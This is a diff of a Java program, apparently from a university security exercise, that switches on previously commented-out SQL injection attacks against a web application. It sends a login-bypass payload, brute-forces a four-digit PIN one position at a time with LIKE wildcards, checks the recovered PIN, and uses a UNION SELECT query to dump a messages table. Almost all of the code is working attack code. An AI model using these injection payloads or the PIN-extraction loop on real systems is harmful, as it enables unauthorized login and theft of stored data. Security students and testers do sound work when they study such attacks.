@@ -1,9 +1,6 @@
-import sun.misc.BASE64Decoder;
-
 import javax.net.ssl.HttpsURLConnection;
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
-import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -20,37 +17,37 @@ public class Main {
         Main main = new Main();
 
         // crack login screen
-//        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password=");
+        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password=");
 
         // find pin
-//        for (int i = 0; i < 4; i++) {
-//            for (int j = 0; j < 10; j++) {
-//                String pin = String.valueOf(j);
-//                switch (i){
-//                    case 0:
-//                        pin = pin + "___";
-//                        break;
-//                    case 1:
-//                        pin = "_" + pin + "__";
-//                        break;
-//                    case 2:
-//                        pin = "__" + pin + "_";
-//                        break;
-//                    case 3:
-//                        pin = "___" + pin;
-//                        break;
-//                    default:
-//                        throw new Exception("Bad state");
-//                }
-//                main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '" + pin + "' OR '&password=");
-//            }
-//        }
+        for (int i = 0; i < 4; i++) {
+            for (int j = 0; j < 10; j++) {
+                String pin = String.valueOf(j);
+                switch (i){
+                    case 0:
+                        pin = pin + "___";
+                        break;
+                    case 1:
+                        pin = "_" + pin + "__";
+                        break;
+                    case 2:
+                        pin = "__" + pin + "_";
+                        break;
+                    case 3:
+                        pin = "___" + pin;
+                        break;
+                    default:
+                        throw new Exception("Bad state");
+                }
+                main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '" + pin + "' OR '&password=");
+            }
+        }
 
         // pin validation
-//        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");
+        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");
 
         // messages exploit
-//        main.sendGet(APP_URL + "/index.php?offset=1%20UNION%20SELECT%20date_time%2C%20base64_xored_message_with_plain_key%20AS%20message%20FROM%20messages");
+        main.sendGet(APP_URL + "/index.php?offset=1%20UNION%20SELECT%20date_time%2C%20base64_xored_message_with_plain_key%20AS%20message%20FROM%20messages");
 
     }
 
